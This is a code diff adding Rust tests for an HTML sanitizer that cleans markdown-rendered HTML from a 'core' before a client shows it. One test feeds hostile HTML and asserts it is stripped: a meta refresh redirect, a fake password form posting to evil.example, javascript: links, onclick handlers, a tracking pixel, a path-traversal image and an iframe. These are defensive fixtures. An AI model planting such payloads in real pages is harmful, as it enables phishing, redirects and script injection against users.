@@ -193,3 +193,89 @@ fn an_ordered_list_start_is_a_number() {
 fn empty_text_gives_empty_html() {
     assert_eq!(html(""), "");
 }
+
+#[test]
+fn the_html_of_a_core_stays_the_same_when_a_client_cleans_it_again() {
+    for text in [
+        "# Plan\n\nSee [the docs](https://example.com/a?b=1&c=2) or [mail](mailto:me@example.com).",
+        "| a | b |\n|:--|--:|\n| 1 | 2 |\n",
+        "```rust\nfn main() {}\n```\n",
+        "![shot](nh://blob/abc_DEF-123) and `code` and ~~gone~~",
+        "5. five\n6. six\n\n- [x] done\n",
+        "<details><summary>more</summary>text</details>",
+    ] {
+        let made = html(text);
+        assert_eq!(clean(&made), made, "{text}");
+    }
+}
+
+#[test]
+fn a_client_removes_what_a_hostile_core_puts_in_its_html() {
+    let hostile = concat!(
+        r#"<meta http-equiv="refresh" content="0;url=nh://open?url=https%3A%2F%2Fevil.example">"#,
+        r#"<base href="https://evil.example/">"#,
+        r#"<style>body { display: none }</style>"#,
+        r#"<form action="https://evil.example"><input name="password"><button>Sign in</button></form>"#,
+        r#"<a href="https://evil.example">raw</a>"#,
+        r#"<a href="nh://open?url=javascript%3Aalert(1)">script</a>"#,
+        r#"<a href="nh://open?url=https%3A%2F%2Fok.example&amp;gesture=x">extra</a>"#,
+        r#"<a href="nh://open?url=http%3A%2F%2Flocalhost%3A8080%2F">service</a>"#,
+        r#"<img src="https://evil.example/pixel.png"><img src="nh://blob/../../x">"#,
+        r#"<p style="position: fixed" class="dialog" id="x" onclick="alert(1)">text</p>"#,
+        r#"<iframe src="https://evil.example"></iframe><svg><a href="x">y</a></svg>"#,
+    );
+    let out = clean(hostile);
+    for gone in [
+        "<meta",
+        "refresh",
+        "<base",
+        "<style",
+        "display",
+        "<form",
+        "<input",
+        "password",
+        "<button",
+        "evil",
+        "javascript",
+        "gesture",
+        "src=",
+        "position",
+        "dialog",
+        "id=",
+        "onclick",
+        "<iframe",
+        "<svg",
+    ] {
+        assert!(!out.contains(gone), "{gone} in {out}");
+    }
+    // A link that a core made keeps its address, in the form that the core writes.
+    assert!(
+        out.contains(
+            r#"<a href="nh://open?url=http%3A%2F%2Flocalhost%3A8080%2F" rel="noopener noreferrer">service</a>"#
+        ),
+        "{out}"
+    );
+    assert!(out.contains("<p>text</p>"), "{out}");
+}
+
+#[test]
+fn every_html_field_of_a_value_is_cleaned_at_any_depth() {
+    let bad = r#"<meta http-equiv="refresh" content="0;url=x"><b>ok</b>"#;
+    let mut value = serde_json::json!({
+        "type": "patch",
+        "ops": [
+            { "op": "set", "key": "i1", "value": { "payload": { "plan": { "html": bad, "truncated": false } } } },
+            { "op": "set", "key": "i2", "value": { "html": 7, "title": bad } },
+        ],
+        "markdown": { "html": bad },
+    });
+    assert_eq!(clean_html_fields(&mut value), 2);
+    assert_eq!(
+        value["ops"][0]["value"]["payload"]["plan"]["html"],
+        "<b>ok</b>"
+    );
+    assert_eq!(value["markdown"]["html"], "<b>ok</b>");
+    // Only a text in a field `html` is HTML. The UI shows the other fields as text.
+    assert_eq!(value["ops"][1]["value"]["html"], 7);
+    assert_eq!(value["ops"][1]["value"]["title"], bad);
+}
